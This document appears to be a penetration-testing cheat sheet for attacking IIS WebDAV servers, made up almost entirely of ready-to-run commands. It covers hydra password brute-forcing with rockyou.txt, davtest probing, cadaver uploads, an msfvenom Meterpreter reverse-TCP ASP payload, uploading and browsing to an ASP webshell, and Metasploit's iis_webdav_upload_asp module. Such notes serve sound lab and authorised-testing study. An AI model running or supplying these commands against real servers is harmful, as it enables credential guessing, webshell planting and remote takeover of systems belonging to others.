# Web Services

## IIS WebDav

<pre class="language-bash" data-title="Enumeration"><code class="lang-bash"><strong># check /webdav/ dir in url
</strong>curl http://IP/webdav/

# try to bruteforcing login page
hydra -l $USER -P rockyou.txt $IP http-post-form "$PATH:$USER_FIELD=^USER^&#x26;$PASS_FIELD=^PASS^:F=incorrect" -V

# davtest tool
# return which file is exec on the target
davtest -auth USER:PASS -url http://IP/webdav/
</code></pre>

{% code title="Exploitation" %}
```bash
# cadaver tool - Manual
cadaver http://IP/webdav
USER
PASS

# Create a Payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f asp > shell.asp

# put webshell 
put /usr/share/webshells/asp/webshell.asp
# Access the webshell using the firefox browser
http://IP/webdav/webshell.asp

# Metasploit
service postgresql start && msfconsole
use exploit/windows/iis/iis_webdav_upload_asp
set RHOSTS IP
set HttpUsername USER
set HttpPassword PASS
set PATH /webdav/metasploit%RAND%.asp
exploit
```
{% endcode %}



